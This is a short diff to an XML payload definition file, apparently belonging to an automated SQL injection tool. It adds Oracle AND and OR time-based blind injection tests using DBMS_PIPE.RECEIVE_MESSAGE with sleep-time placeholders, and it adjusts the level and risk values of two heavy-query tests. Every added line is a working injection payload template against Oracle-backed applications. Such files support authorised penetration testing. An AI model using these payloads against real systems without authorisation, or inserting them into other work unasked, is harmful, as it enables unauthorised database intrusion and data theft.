@@ -1421,9 +1421,27 @@ Formats:
     </test>
 
     <test>
+        <title>Oracle AND time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>Oracle AND time-based blind (heavy query)</title>
         <stype>5</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
@@ -1560,12 +1578,30 @@ Formats:
             <dbms>MySQL</dbms>
         </details>
     </test>
+    
+    <test>
+        <title>Oracle OR time-based blind</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <request>
+            <payload>OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
 
     <test>
         <title>Oracle OR time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>3</level>
-        <risk>3</risk>
+        <risk>4</risk>
         <clause>1,2,3</clause>
         <where>2</where>
         <request>
